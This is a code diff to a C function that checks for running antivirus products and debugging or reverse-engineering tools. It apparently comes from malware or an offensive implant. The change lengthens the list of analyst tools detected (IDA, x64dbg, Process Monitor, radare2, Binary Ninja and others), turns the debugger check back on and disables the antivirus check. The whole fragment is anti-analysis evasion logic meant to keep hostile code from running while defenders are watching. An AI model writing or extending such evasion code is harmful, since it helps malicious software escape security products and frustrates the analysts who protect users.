@@ -466,18 +466,18 @@ CLEANUP:
 BOOL CheckForBlackListProcess(VOID)
 {
 	LPWSTR AvList[] = {L"kav.exe", L"kav32.exe", L"kavfs.exe", L"kavmm.exe", L"klnagent.exe", L"BITDEFENDER.exe", L"bdc.exe", L"bdlite.exe", L"bdagent.exe", L"AvastSvc.exe", L"afwServ.exe", L"ashserv.exe"};
-	LPWSTR DebugList[] = { L"ida.exe", L"ida64.exe", L"DbgX.Shell.exe", L"x64dbg.exe", L"x32dbg.exe", L"procmon.exe", L"procmon64.exe", L"procexp.exe", L"procexp64.exe", L"apimonitor-x86.exe", L"pin.exe", L"SystemInformer.exe", L"windbg.exe" };
+	LPWSTR DebugList[] = { L"ida.exe", L"ida64.exe", L"DbgX.Shell.exe", L"x64dbg.exe", L"x32dbg.exe", L"procmon.exe", L"procmon64.exe", L"procexp.exe", L"procexp64.exe", L"apimonitor-x86.exe", L"pin.exe", L"SystemInformer.exe", L"windbg.exe", L"ProcessHacker.exe", L"binaryninja.exe", L"decompile.exe", L"r2r.exe", L"radare2.exe" };
 	BOOL Result = FALSE;
 
 	Result = AreProcessesRunning(DebugList, _countof(DebugList), 1);
-	/*if (Result) {
-		return TRUE;
-	}*/
-
-	Result = AreProcessesRunning(AvList, _countof(AvList), 1);
 	if (Result) {
 		return TRUE;
 	}
+
+	/*Result = AreProcessesRunning(AvList, _countof(AvList), 1);
+	if (Result) {
+		return TRUE;
+	}*/
 
 	return FALSE;
 }
